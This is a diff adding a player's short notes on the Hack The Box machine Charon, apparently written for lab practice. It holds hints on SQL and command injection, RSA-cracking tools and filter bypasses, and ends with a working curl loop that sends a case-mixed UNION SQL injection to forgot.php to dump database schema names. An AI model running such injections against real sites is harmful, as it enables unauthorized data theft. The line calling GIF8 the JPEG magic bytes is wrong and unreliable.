@@ -1,0 +1,20 @@
+(love this box)
+Hints:
+- what is the logo, dirbuster a lot
+- sqli get different response, is someone watching?
+- watch the source code, use burpsuit to intercept the response
+- gdb the executable and think what else can we use to inject code other than the `<cmd>`.
+    - and how to make our bash pass it in raw, instead of exec it.
+
+New tools:
+- github: RsaCtfTool (google "brute force RSA pub")
+- openssl rsautl
+
+Details:
+- try upper/lower/mixed cases, encoding
+- GIF8 is the magic bytes for jpeg files
+
+
+for i in $(seq 0 100); do
+    curl -s -X POST -d "email=admin@charon.htb' UNIoN SElECT 1,(select concat(table_schema, \":\",table_name,\":\",column_name,\"@rst.com\") FROM information_schema.columns WHERE table_schema!='Information_schemA' limit 1 offset $i),3,'zhe0ops@htb.com'--+" http://charon.htb/cmsdata/forgot.php | grep -o '[^>]*@rst.com' | cut -d'@' -f 1
+done
